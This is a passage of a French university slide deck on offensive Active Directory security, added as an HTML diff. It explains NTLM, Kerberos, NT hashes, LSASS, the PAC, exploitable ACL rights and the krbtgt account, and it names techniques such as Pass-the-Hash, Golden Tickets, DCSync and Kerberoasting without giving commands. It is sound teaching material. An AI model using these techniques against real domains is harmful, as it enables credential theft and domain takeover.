@@ -1,0 +1,1440 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Active Directory — Sécurité Offensive</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/theme/black.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/monokai.css">
+  <style>
+    /* === BASE === */
+    .reveal { font-size: 24px; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
+
+    :root {
+      --red:    #e63946;
+      --blue:   #4cc9f0;
+      --yellow: #ffd60a;
+      --green:  #4ade80;
+    }
+
+    /* Force slides to stay within bounds */
+    .reveal .slides section {
+      padding: 18px 30px 18px 30px;
+      box-sizing: border-box;
+      overflow: hidden;
+      height: 100%;
+    }
+
+    .reveal h1, .reveal h2, .reveal h3 {
+      color: var(--blue);
+      text-transform: none;
+      font-weight: 700;
+      letter-spacing: -0.01em;
+      margin-bottom: 0.4em;
+    }
+    .reveal h2 { font-size: 1.3em; }
+    .reveal h3 { font-size: 1.05em; color: var(--yellow); }
+
+    .reveal .slides section { text-align: left; }
+    .reveal .slides section.ctr    { text-align: center; }
+
+    .reveal strong { color: var(--yellow); }
+    .reveal em     { color: var(--blue); font-style: normal; }
+
+    .reveal li   { margin-bottom: 0.35em; line-height: 1.55; }
+    .reveal p    { line-height: 1.55; margin-bottom: 0.3em; }
+    .reveal ul ul { font-size: 0.9em; margin-top: 0.15em; }
+
+    /* === TABLES === */
+    .reveal table {
+      font-size: 0.6em;
+      border-collapse: collapse;
+      width: 100%;
+      table-layout: fixed;
+    }
+    .reveal table th {
+      color: var(--blue);
+      border-bottom: 1px solid #444;
+      padding: 0.35em 0.5em;
+      text-align: left;
+      font-weight: 600;
+    }
+    .reveal table td {
+      padding: 0.3em 0.5em;
+      border-bottom: 1px solid #222;
+      vertical-align: top;
+      word-break: break-word;
+    }
+    .reveal table tr:last-child td { border-bottom: none; }
+    .reveal table code {
+      font-size: 0.82em;
+      background: #1e2330;
+      padding: 1px 3px;
+      border-radius: 2px;
+      color: var(--blue);
+    }
+
+    /* === CODE === */
+    .reveal pre {
+      width: 100%; font-size: 0.54em;
+      box-shadow: none; border-radius: 6px; margin: 0.4em 0;
+    }
+    .reveal pre code { max-height: 280px; border-radius: 6px; padding: 0.7em 0.9em; }
+
+    .reveal code:not([class]) {
+      background: #1e2330; padding: 1px 5px;
+      border-radius: 3px; color: var(--blue); font-size: 0.84em;
+    }
+
+    /* === BOXES === */
+    .hlbox {
+      border-left: 3px solid var(--red);
+      padding: 0.4em 0.75em;
+      background: rgba(230,57,70,0.12);
+      border-radius: 0 4px 4px 0;
+      margin: 0.4em 0;
+      font-size: 0.9em;
+      line-height: 1.5;
+    }
+    .infobox {
+      border-left: 3px solid var(--blue);
+      padding: 0.4em 0.75em;
+      background: rgba(76,201,240,0.1);
+      border-radius: 0 4px 4px 0;
+      margin: 0.4em 0;
+      font-size: 0.9em;
+      line-height: 1.5;
+    }
+    .warnbox {
+      border-left: 3px solid var(--yellow);
+      padding: 0.4em 0.75em;
+      background: rgba(255,214,10,0.08);
+      border-radius: 0 4px 4px 0;
+      margin: 0.4em 0;
+      font-size: 0.9em;
+      line-height: 1.5;
+    }
+
+    /* === LAYOUTS === */
+    .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 0.5em 1.5em; }
+    .three-col { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 0.5em 1em; }
+
+    /* === MONO DIAGRAM BOX === */
+    .mbox {
+      font-size: 0.68em;
+      background: #0d1117;
+      border-radius: 6px;
+      padding: 0.7em 0.9em;
+      font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+      line-height: 1.8;
+      margin: 0.4em 0;
+    }
+    .mc { color: #4cc9f0; }
+    .my { color: #ffd60a; }
+    .mr { color: #e63946; }
+    .mg { color: #666; }
+    .mw { color: #ccc; }
+    .ms { color: #4ade80; }
+
+    /* === MISC === */
+    .copyright {
+      position: fixed; bottom: 7px; right: 12px;
+      font-size: 0.4em; color: #444; z-index: 200;
+      font-family: monospace; letter-spacing: 0.05em;
+    }
+    .part-number {
+      font-size: 0.58em; color: var(--red);
+      letter-spacing: 0.28em; text-transform: uppercase;
+      margin-bottom: 0.3em; font-family: monospace;
+    }
+    .tag {
+      display: inline-block;
+      background: var(--red); color: #fff;
+      font-size: 0.55em; padding: 1px 7px;
+      border-radius: 10px; vertical-align: middle;
+      letter-spacing: 0.05em;
+    }
+    .tag-b { background: #2563eb; }
+    .small { font-size: 0.82em; }
+    .sub   { color: #888; font-size: 0.8em; margin: 0; }
+  </style>
+</head>
+<body>
+<div class="copyright">© Volker Carstein — Parabellum Services</div>
+<div class="reveal">
+<div class="slides">
+
+
+<!-- =====================================================================
+     TITRE
+     ===================================================================== -->
+<section class="ctr"
+  data-background-gradient="linear-gradient(135deg,#0d1117 0%,#161b22 60%,#1a1a2e 100%)">
+  <div style="border:2px solid #e63946;padding:1.8em 2.5em;border-radius:10px;display:inline-block;min-width:72%;">
+    <p style="color:#e63946;font-size:0.55em;letter-spacing:0.3em;text-transform:uppercase;margin:0 0 0.4em;">Département Info - IUT Aix-en-Provence  - Aix-Marseille Université</p></br>
+    <h1 style="color:#fff;font-size:1.7em;margin:0 0 0.2em;">Active Directory</h1>
+    <h2 style="color:#4cc9f0;font-size:1.1em;margin:0 0 1em;letter-spacing:0.05em;">Sécurité Offensive</h2>
+    <hr style="border:none;border-top:1px solid #333;margin:0.7em 0;">
+    <p style="font-size:0.55em;color:#aaa;margin:0.3em 0;">Volker Carstein | Parabellum Services © 2026 </p>
+  </div>
+</section>
+
+
+<!-- PLAN -->
+<section>
+  <h2>Plan du cours</h2>
+  <div class="two-col" style="font-size:0.88em;margin-top:0.5em;">
+    <div>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.1em;">0 — Rappels essentiels</p>
+      <p class="sub" style="margin:0 0 0.6em 1em;">Pentest &amp; Red Team · Architecture AD · Comptes · GPO · NTLM · Kerberos · ACL</p>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.1em;">1 — Reconnaissance</p>
+      <p class="sub" style="margin:0 0 0.6em 1em;">Énumération LDAP · SPNs · Groupes · Attributs offensifs</p>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.1em;">2 — Attaques sur les credentials</p>
+      <p class="sub" style="margin:0 0 0.6em 1em;">Password Spraying · AS-REP Roasting · Kerberoasting</p>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.1em;">3 — Attaques sur les tickets</p>
+      <p class="sub" style="margin:0 0 0 1em;">PtH · PtT · Silver Ticket · Golden Ticket</p>
+    </div>
+    <div>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.1em;">4 — NTLM &amp; Relay</p>
+      <p class="sub" style="margin:0 0 0.6em 1em;">LLMNR Poisoning · SMB Relay · LDAP Relay</p>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.1em;">5 — Abus des ACLs</p>
+      <p class="sub" style="margin:0 0 0.6em 1em;">GenericAll · WriteDACL · AdminSDHolder · DCSync</p>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.1em;">6 — Délégation Kerberos</p>
+      <p class="sub" style="margin:0 0 0 1em;">Unconstrained · Constrained · RBCD</p>
+    </div>
+  </div>
+  <div class="infobox" style="margin-top:0.8em;">
+    Ce cours est purement théorique — le TP BloodHound CE est traité en séance de l'après-midi
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE 0 — RAPPELS
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#200000 0%,#4a0000 100%)" class="ctr">
+  <p class="part-number">Partie 0</p>
+  <h1 style="color:#fff;font-size:1.8em;">Rappels essentiels</h1>
+  <p style="color:var(--red);font-size:0.9em;">Contexte · Active Directory · Protocoles · Permissions</p>
+</section>
+
+
+<!-- Aparté Pentest / Red Team -->
+<section>
+  <h2><span class="tag tag-b">Aparté</span> Test d'intrusion (pentest)</h2>
+  <ul>
+    <li>Un <strong>test d'intrusion</strong> est une évaluation de sécurité mandatée : un professionnel simule une attaque réelle dans un cadre contractuel précis, avec pour objectif d'identifier des vulnérabilités exploitables.</li>
+    <li>La portée est définie à l'avance par un document juridique (lettre de mission / Rules of Engagement) : périmètre technique (IPs, domaines, applications), types d'attaques autorisées, fenêtres horaires. Rien ne se fait hors périmètre.</li>
+    <li>L'objectif livrable est un <strong>rapport</strong> : liste des vulnérabilités, preuves d'exploitation (screenshots, outputs), niveau de criticité (CVSS ou autre), recommandations de remédiation.</li>
+  </ul>
+  <div class="two-col" style="font-size:0.9em;margin-top:0.5em;">
+    <div>
+      <p style="color:var(--blue);font-weight:bold;margin:0 0 0.2em;">Point de vue client</p>
+      <ul>
+        <li>Résultat concret et actionnable</li>
+        <li>Durée et coût maîtrisés</li>
+        <li>Permet de corriger des failles précises</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--blue);font-weight:bold;margin:0 0 0.2em;">Point de vue opérateur</p>
+      <ul>
+        <li>Couvrir le maximum de surface dans le temps imparti</li>
+        <li>Documenter rigoureusement chaque trouvaille</li>
+        <li>Respecter scrupuleusement le périmètre</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section>
+  <h2><span class="tag tag-b">Aparté</span> Red Team</h2>
+  <ul>
+    <li>Une mission de <strong>red team</strong> simule une attaque réaliste et persistante inspirée d'un scénario adversarial crédible (APT, compromission fournisseur, insider threat, etc.). L'objectif n'est <em>pas</em> de faire l'inventaire de toutes les vulnérabilités, mais de tester la capacité de l'organisation à <strong>détecter et répondre</strong> à une intrusion réelle.</li>
+    <li>La red team opère souvent à l'insu des équipes défensives (blue team) — c'est la condition pour mesurer leur réactivité réelle. Elle opère sur une durée longue (semaines à mois) avec un périmètre très large, voire full-scope.</li>
+    <li>Les TTPs employées cherchent à imiter un/des acteur(s) réel(s) : <strong>évasion de détection, persistance, OPSEC rigoureux</strong> — l'objectif est de ne pas se faire détecter tout en atteignant les cibles définies.</li>
+  </ul>
+  <div class="two-col" style="font-size:0.9em;margin-top:0.5em;">
+    <div>
+      <p style="color:var(--blue);font-weight:bold;margin:0 0 0.2em;">Point de vue client</p>
+      <ul>
+        <li>Mesure la maturité sécurité globale (humains, processus, outils)</li>
+        <li>Révèle les lacunes de détection, pas seulement les failles techniques</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--blue);font-weight:bold;margin:0 0 0.2em;">Point de vue opérateur</p>
+      <ul>
+        <li>Priorité à la discrétion et à la persistance</li>
+        <li>Rapport centré sur le chemin d'intrusion complet et les "detection gaps"</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section>
+  <h2><span class="tag tag-b">Aparté</span> Pentest vs Red Team</h2>
+  <table style="margin-top:0.5em;">
+    <thead><tr><th style="width:22%;"></th><th>Pentest</th><th>Red Team</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Objectif</strong></td><td>Identifier des vulnérabilités</td><td>Tester la détection et la réponse</td></tr>
+      <tr><td><strong>Durée</strong></td><td>Jours à semaines</td><td>Semaines à mois</td></tr>
+      <tr><td><strong>Périmètre</strong></td><td>Défini et restreint contractuellement</td><td>Large ou full-scope</td></tr>
+      <tr><td><strong>Blue team informée</strong></td><td>Oui (généralement)</td><td>Non — test à l'insu</td></tr>
+      <tr><td><strong>Discrétion / OPSEC</strong></td><td>Secondaire</td><td>Prioritaire</td></tr>
+      <tr><td><strong>Livrable</strong></td><td>Rapport de vulnérabilités + remédiation</td><td>Rapport comprenant les chemins d'intrusions + lacunes de détection</td></tr>
+      <tr><td><strong>Profil opérateur</strong></td><td>Méthodique, orienté couverture</td><td>Créatif, orienté persistance et évasion</td></tr>
+    </tbody>
+  </table>
+  <div class="infobox" style="margin-top:0.5em;">
+    Les deux approches sont complémentaires : le pentest aide à corriger les failles connues, la red team vérifie la détection/la réaction ainsi que les cas plus "réalistes"
+  </div>
+</section>
+
+
+<!-- Rappels AD -->
+<section>
+  <h2>Active Directory — Architecture de base</h2>
+  <ul>
+    <li><strong>Active Directory Domain Services (AD DS)</strong> est le service d'annuaire de Microsoft, présent dans la quasi-totalité des entreprises de taille significative. Il centralise l'authentification, les autorisations et la gestion de configuration du parc Windows.</li>
+    <li>Structure hiérarchique : <strong>Forêt</strong> &gt; <strong>Domaine(s)</strong> &gt; <strong>Unités d'Organisation (OU)</strong> &gt; <strong>Objets</strong>. La <em>forêt</em> est la vraie frontière de sécurité — pas le domaine.</li>
+    <li>Le <strong>Contrôleur de Domaine (DC)</strong> héberge la base AD (<code>NTDS.dit</code>), gère les authentifications (Kerberos, NTLM) et répond aux requêtes LDAP. Tous les DCs d'un domaine se répliquent entre eux — compromettre l'un d'eux suffit à compromettre le domaine entier.</li>
+    <li>Les objets AD sont accessibles en lecture LDAP à <strong>tout utilisateur authentifié du domaine</strong> — conception volontaire de Microsoft pour la résolution de noms et les applications métier. Cela signifie qu'un attaquant avec un seul compte peut cartographier l'intégralité de l'annuaire.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Types d'objets et de comptes dans AD</h2>
+  <div class="two-col" style="font-size:0.9em;">
+    <div>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.3em;">Objets principaux</p>
+      <ul>
+        <li><strong>User</strong> — compte d'utilisateur humain</li>
+        <li><strong>Computer</strong> — chaque machine joinée au domaine possède un compte <code>MACHINE$</code> (MDP 120 car., rotation 30j)</li>
+        <li><strong>Group</strong> — Security group (permissions) ou Distribution group (messagerie)</li>
+        <li><strong>OU</strong> — Unité d'Organisation : conteneur pour délégation et application de GPO</li>
+      </ul>
+      <p style="color:var(--red);font-weight:bold;margin:0.5em 0 0.3em;">Comptes de service</p>
+      <ul>
+        <li><strong>Service accounts</strong> — comptes dédiés à l'exécution d'applications, souvent avec SPN et mot de passe permanent</li>
+        <li><strong>gMSA</strong> — mot de passe géré et renouvelé automatiquement par AD (bonne pratique)</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.3em;">Comptes built-in importants</p>
+      <ul>
+        <li><code>Administrator</code> (RID 500) — admin local de la machine, ou admin du domaine sur les DCs</li>
+        <li><code>krbtgt</code> (RID 502) — compte de service du KDC, <em>désactivé</em>, son hash chiffre tous les TGTs du domaine</li>
+        <li><code>Guest</code> (RID 501) — compte invité, désactivé par défaut</li>
+      </ul>
+      <p style="color:var(--red);font-weight:bold;margin:0.5em 0 0.3em;">Groupes privilégiés clés</p>
+      <ul>
+        <li><strong>Domain Admins</strong> — admin complet sur le domaine</li>
+        <li><strong>Enterprise Admins</strong> — admin sur toute la forêt</li>
+        <li><strong>Domain Controllers</strong> — les DCs eux-mêmes</li>
+        <li><strong>Backup Operators, Server Operators</strong> — droits sensibles sur les DCs</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section>
+  <h2>GPO — Group Policy Objects</h2>
+  <ul style="font-size:0.92em;">
+    <li>Les GPO appliquent des <strong>configurations centralisées</strong> à des users et machines : sécurité, scripts, logiciels, pare-feu, politique de mots de passe. Elles sont liées à un Site, un Domaine ou une OU (ordre LSDOU — les plus proches l'emportent).</li>
+    <li>Stockées dans <strong>SYSVOL</strong> (<code>\\corp.local\SYSVOL\</code>), accessible en lecture à tout utilisateur du domaine.</li>
+  </ul>
+  <div class="two-col" style="font-size:0.9em;margin-top:0.4em;">
+    <div>
+      <p style="color:var(--blue);font-weight:bold;margin:0 0 0.2em;">Intérêt défensif</p>
+      <ul>
+        <li>Désactiver LLMNR/NBT-NS</li>
+        <li>Activer SMB signing, LAPS</li>
+        <li>Politique de mots de passe fine (PSO)</li>
+        <li>Restriction des droits admin locaux</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.2em;">Intérêt offensif</p>
+      <ul>
+        <li>SYSVOL peut contenir des credentials (anciens scripts GPP)</li>
+        <li>Modifier une GPO liée à un DC → exécution de code sur tous les DCs</li>
+        <li>Identifier les configurations faibles déployées en masse</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section>
+  <h2>SID — Security Identifier</h2>
+  <ul>
+    <li>Le SID est l'<strong>identifiant unique et permanent</strong> d'un principal de sécurité (user, groupe, ordinateur). Contrairement au nom, il ne change pas lors d'un renommage — c'est lui que Windows utilise en interne pour toutes les décisions d'autorisation.</li>
+    <li>Format : <code>S-1-5-21-[domaine1]-[domaine2]-[domaine3]-[RID]</code> — les trois valeurs identifient le domaine, le RID (Relative Identifier) identifie l'objet dans ce domaine.</li>
+    <li>Le <strong>PAC</strong> (Privilege Attribute Certificate), extension Microsoft intégrée aux tickets Kerberos, contient la liste des SID de l'utilisateur (son propre SID + SID de tous ses groupes). Les services lisent le PAC pour décider des autorisations sans re-contacter le DC.</li>
+  </ul>
+  <table style="font-size:0.62em;margin-top:0.5em;">
+    <tr><td style="width:15%;"><code>...-500</code></td><td><strong>Administrator</strong> — admin local ou du domaine selon le contexte</td></tr>
+    <tr><td><code>...-502</code></td><td><strong>krbtgt</strong> — compte de service KDC, toujours désactivé</td></tr>
+    <tr><td><code>...-512</code></td><td><strong>Domain Admins</strong></td></tr>
+    <tr><td><code>...-519</code></td><td><strong>Enterprise Admins</strong> — admin sur toute la forêt</td></tr>
+    <tr><td><code>...-516</code></td><td><strong>Domain Controllers</strong></td></tr>
+  </table>
+</section>
+
+<section>
+  <h2>Authentification NTLM — Mécanisme</h2>
+  <p class="sub">Challenge-response à 3 messages — aucun mot de passe ni hash transmis en clair</p>
+  <div class="mbox">
+    <p><span class="my">1. NEGOTIATE</span>  <span class="mc">Client ──────→ Serveur</span> <span class="mg">: annonce les capacités supportées</span></p>
+    <p><span class="my">2. CHALLENGE</span>  <span class="mc">Serveur ─────→ Client</span>  <span class="mg">: nonce aléatoire de 8 octets (challenge)</span></p>
+    <p><span class="my">3. AUTHENTICATE</span> <span class="mc">Client ──────→ Serveur</span></p>
+    <p style="margin-left:2em;"><span class="mc">└─ Net-NTLMv2 = </span><span class="mr">HMAC-MD5(NT_hash, challenge + client_nonce + timestamp + ...)</span></p>
+  </div>
+  <ul style="margin-top:0.3em;">
+    <li>Le <strong>NT hash</strong> n'est jamais transmis — seul le résultat du HMAC-MD5 (Net-NTLMv2) voyage sur le réseau. Le serveur vérifie en recalculant de son côté avec le hash stocké, ou via Netlogon passthrough vers le DC.</li>
+    <li><strong>Net-NTLMv2 ≠ NT hash</strong> : on ne peut pas utiliser un Net-NTLMv2 capturé pour du Pass-the-Hash — mais on peut le cracker offline ou le relayer en temps réel vers une autre cible.</li>
+    <li>NTLM est utilisé automatiquement en fallback : accès par IP, service sans SPN, clients hors domaine — il est pratiquement impossible de l'éliminer complètement.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>NT Hash — Un credential Windows intéressant</h2>
+  <ul>
+    <li>Windows ne stocke <em>jamais</em> les mots de passe en clair — il stocke uniquement leur <strong>empreinte NT hash</strong> : <code>NT_hash = MD4(mot_de_passe_UTF-16LE)</code>. Hash non-salé de 16 octets (128 bits).</li>
+    <li>Absence de sel = vulnérabilité structurelle : deux comptes avec le même mot de passe ont <em>exactement</em> le même NT hash — attaque en parallèle possible, rainbow tables applicables.</li>
+    <li>Le NT hash est stocké dans <strong>NTDS.dit</strong> (sur les DCs, l'équivalent de <code>/etc/shadow</code> pour tout le domaine) et dans la base <strong>SAM</strong> locale (comptes locaux de chaque machine).</li>
+    <li>En mémoire, <strong>LSASS</strong> (Local Security Authority Subsystem Service) maintient les NT hashes des sessions actives. Les extraire nécessite les droits SYSTEM ou <code>SeDebugPrivilege</code> — c'est une des actions a effectuer en priorité après la compromission d'une machine.</li>
+  </ul>
+  <div class="hlbox">
+    Le NT hash est un <em>credential à part entière</em> — il suffit à s'authentifier via NTLM sans connaître le mot de passe en clair
+  </div>
+</section>
+
+<section>
+  <h2>Les hashes comme credentials à part entière</h2>
+  <ul>
+    <li>L'une des propriétés les plus importantes — et les plus dangereuses — du protocole NTLM est que le <strong>NT hash lui-même est le credential</strong> : il n'est pas un dérivé intermédiaire du vrai mot de passe, c'est directement ce qui est utilisé dans le protocole d'authentification.</li>
+    <li>Conséquence directe : si on obtient le NT hash d'un compte, on peut <strong>s'authentifier en tant que ce compte</strong> sur n'importe quel service NTLM, sans jamais connaître le mot de passe en clair. C'est la technique du <em>Pass-the-Hash</em>.</li>
+    <li>Les NT hashes se trouvent à deux endroits principaux : en mémoire dans le processus <strong>LSASS</strong> (pour les sessions actives) et dans le fichier <strong>NTDS.dit</strong> sur les DCs (pour tous les comptes du domaine). Accéder à l'un ou l'autre avec les droits appropriés suffit à extraire tous les hashes.</li>
+    <li>Pour Kerberos, le NT hash sert de clé symétrique pour chiffrer la pré-authentification — ce qui permet <strong>l'Overpass-the-Hash</strong> : utiliser le NT hash pour obtenir un TGT Kerberos valide, même sans connaître le mot de passe en clair.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Kerberos V5 — Rappel du flux</h2>
+  <p class="sub">Protocole d'authentification par défaut dans AD — basé sur des tickets à durée de vie limitée</p>
+  <div class="mbox" style="font-size:0.64em;">
+    <p><span class="my">1. AS-REQ</span>  <span class="mc">Client ──→ KDC (AS)</span> <span class="mg">: identité (clair) + pré-auth [timestamp chiffré avec le secret du client]</span></p>
+    <p><span class="my">2. AS-REP</span>  <span class="mc">KDC ────→ Client</span></p>
+    <p style="margin-left:1.5em;"><span class="mc">├─ TGT </span><span class="mr">[chiffré avec hash krbtgt — opaque pour le client]</span> <span class="mg">contient : identité, PAC, clé session Kc-tgs, validité</span></p>
+    <p style="margin-left:1.5em;"><span class="mc">└─ Partie client </span><span class="mr">[chiffrée avec le secret du client]</span> <span class="mg">contient : clé session Kc-tgs</span></p>
+    <p><span class="my">3. TGS-REQ</span> <span class="mc">Client ──→ KDC (TGS)</span> <span class="mg">: TGT + authenticator [chiffré avec Kc-tgs] + SPN souhaité</span></p>
+    <p><span class="my">4. TGS-REP</span> <span class="mc">KDC ────→ Client</span></p>
+    <p style="margin-left:1.5em;"><span class="mc">├─ Service Ticket (ST) </span><span class="mr">[chiffré avec hash du compte de service — opaque]</span> <span class="mg">contient : PAC, identité, clé session Kc-srv</span></p>
+    <p style="margin-left:1.5em;"><span class="mc">└─ Partie client </span><span class="mr">[chiffrée avec Kc-tgs]</span> <span class="mg">contient : clé session Kc-srv</span></p>
+    <p><span class="my">5. AP-REQ</span>  <span class="mc">Client ──→ Service</span> <span class="mg">: ST + authenticator [chiffré avec Kc-srv — prouve la possession de Kc-srv]</span></p>
+    <p><span class="my">6. AP-REP</span>  <span class="mc">Service ─→ Client</span> <span class="mg">: [optionnel] timestamp+1 chiffré avec Kc-srv — authentification mutuelle</span></p>
+  </div>
+  <div class="infobox" style="font-size:0.8em;margin-top:0.3em;">
+    Étapes 5–6 : le service déchiffre le ST avec son propre hash et valide l'authenticator — le KDC n'est <em>plus consulté</em>
+  </div>
+</section>
+
+<section>
+  <h2>Kerberos V5 — Le PAC et les points d'attaque</h2>
+  <ul>
+    <li>Le PAC (Privilege Attribute Certificate) est signé avec le hash krbtgt (signature KDC) et le hash du compte de service (signature serveur). Forger un PAC valide nécessite donc le hash krbtgt (Golden Ticket) ou celui du compte de service (Silver Ticket).</li>
+    <li>C'est le PAC que les services lisent pour les autorisations — pas les groupes AD en temps réel. Si on forge le PAC, on contrôle les droits que le service nous accorde.</li>
+  </ul>
+  <table style="margin-top:0.4em;">
+    <thead><tr><th>Élément Kerberos</th><th>Attaque associée</th><th>Prérequis</th></tr></thead>
+    <tbody>
+      <tr><td>AS-REP (étape 2)</td><td>AS-REP Roasting</td><td><code>DONT_REQ_PREAUTH</code> activé</td></tr>
+      <tr><td>TGS-REP (étape 4)</td><td>Kerberoasting</td><td>SPN sur compte utilisateur</td></tr>
+      <tr><td>Tickets en mémoire LSASS</td><td>Pass-the-Ticket</td><td>Droits admin local → dump LSASS</td></tr>
+      <tr><td>Hash krbtgt</td><td>Golden Ticket</td><td>DCSync / compromission DC</td></tr>
+      <tr><td>Hash compte de service</td><td>Silver Ticket</td><td>Compromission du compte de service</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section>
+  <h2>ACL / DACL / ACE — Le modèle de permissions AD</h2>
+  <ul>
+    <li>Chaque objet AD possède un <strong>Security Descriptor</strong> qui contient sa DACL (Discretionary Access Control List). La DACL est une liste d'ACE (Access Control Entry) — chaque ACE définit ce qu'un principal peut (ou ne peut pas) faire sur l'objet.</li>
+    <li>Une ACE = un triplet : <em>(principal, type de droit, allow/deny)</em>. Exemple : "alice — Full Control — Allow" sur le compte bob signifie qu'alice peut tout faire sur bob.</li>
+    <li>Les ACE sont <strong>héritées</strong> des OUs parentes. Une ACE placée sur une OU s'applique automatiquement à tous les objets enfants — une seule permission mal configurée peut compromettre des centaines d'objets.</li>
+    <li>Les mauvaises configurations d'ACE s'accumulent sur des années sans audit. Elles constituent souvent le chemin d'attaque le plus direct vers des privilèges élevés — sans exploiter aucune CVE.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>ACE offensives — Nommage Microsoft et équivalent BloodHound</h2>
+  <table style="font-size:0.58em;">
+    <thead>
+      <tr><th style="width:30%;">Nom Microsoft (ADUC / API)</th><th style="width:18%;">BloodHound</th><th style="width:52%;">Impact offensif</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>Full Control</strong> / Generic All</td><td><code>GenericAll</code></td><td>Contrôle total : réinitialiser mot de passe, modifier attributs, ajouter au groupe, modifier DACL...</td></tr>
+      <tr><td><strong>Generic Write</strong></td><td><code>GenericWrite</code></td><td>Modifier les attributs non protégés : SPN, délégation, scriptPath, msDS-KeyCredentialLink</td></tr>
+      <tr><td><strong>Modify owner</strong> (WRITE_OWNER)</td><td><code>WriteOwner</code></td><td>Prendre la propriété → WRITE_DAC implicite → GenericAll</td></tr>
+      <tr><td><strong>Modify permissions</strong> (WRITE_DAC)</td><td><code>WriteDACL</code></td><td>Réécrire la DACL → s'attribuer n'importe quel droit, y compris DCSync sur l'objet Domaine</td></tr>
+      <tr><td><strong>Reset password</strong> (User-Force-Change-Password)</td><td><code>ForceChangePassword</code></td><td>Changer le mot de passe sans connaître l'actuel</td></tr>
+      <tr><td><strong>Add/remove self as member</strong> (Self-Membership)</td><td><code>AddMember</code></td><td>S'ajouter ou ajouter un compte contrôlé à un groupe</td></tr>
+      <tr><td><strong>All Extended Rights</strong></td><td><code>AllExtendedRights</code></td><td>Reset password + lecture LAPS + DS-Replication selon l'objet</td></tr>
+      <tr><td><strong>DS-Replication-Get-Changes-All</strong> (Extended Right)</td><td><code>DCSync</code></td><td>Droits de réplication AD → extraire tous les hashes du domaine</td></tr>
+      <tr><td><strong>WriteProperty sur <code>servicePrincipalName</code> uniquement</strong></td><td><code>WriteSPN</code></td><td>Ajouter un SPN sur un compte → Targeted Kerberoasting. Sous-ensemble de GenericWrite : Shadow Credentials impossible (msDS-KeyCredentialLink non accessible) cf. Partie 5</td></tr>
+      <tr><td><strong>Read LAPS password</strong> (ms-Mcs-AdmPwd)</td><td><code>ReadLAPSPassword</code></td><td>Lire le mot de passe du compte admin local géré par LAPS sur un objet Computer</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section>
+  <h2>Le compte krbtgt — Cible (plus que) privilégiée</h2>
+  <ul>
+    <li>Le compte <strong>krbtgt</strong> est le compte de service du KDC. Son NT hash est la clé symétrique utilisée pour <em>chiffrer et signer tous les TGT</em> émis dans le domaine — c'est le secret le plus critique d'un domaine AD.</li>
+    <li>Obtenir le NT hash de krbtgt permet de <strong>forger n'importe quel TGT</strong> (Golden Ticket) : n'importe quel utilisateur, n'importe quels droits, n'importe quelle durée de validité — sans contact avec le DC.</li>
+    <li>Le compte krbtgt est désactivé par défaut et doit le rester. Son mot de passe ne change que sur action manuelle explicite de l'administrateur.</li>
+    <li>Pour invalider un Golden Ticket déjà émis, il faut changer le mot de passe de krbtgt <strong>deux fois</strong> à au moins 10 minutes d'intervalle (AD maintient les deux derniers hashes comme valides pour éviter les coupures de service).</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Active Directory comme surface d'attaque</h2>
+  <ul>
+    <li>La centralisation d'AD — identités, authentifications, autorisations, configurations — en fait la cible prioritaire. Compromettre AD, c'est compromettre l'ensemble du SI.</li>
+    <li>Les ransomwares modernes (Conti, LockBit...) exploitent systématiquement AD pour se propager latéralement et chiffrer le réseau en quelques heures après le foothold initial.</li>
+    <li>Le schéma d'attaque est quasi-constant : <em>compte bas-privilège → énumération LDAP → exploitation de mauvaises configurations → escalade vers Domain Admin</em>. Aucune CVE n'est nécessaire si les configurations sont faibles.</li>
+  </ul>
+  <div class="two-col" style="font-size:0.9em;margin-top:0.4em;">
+    <div>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.2em;">Cibles prioritaires</p>
+      <ul>
+        <li><strong>NTDS.dit</strong> sur les DCs — hashes de tous les comptes</li>
+        <li><strong>LSASS</strong> en mémoire — hashes et tickets actifs</li>
+        <li><strong>krbtgt</strong> — clé de tout le domaine</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--red);font-weight:bold;margin:0 0 0.2em;">Vecteurs typiques</p>
+      <ul>
+        <li>Mauvaises configurations ACE</li>
+        <li>Comptes de service avec mot de passe faibles</li>
+        <li>Délégation Kerberos mal configurée</li>
+        <li>Absence de SMB Signing</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE 1 — RECONNAISSANCE
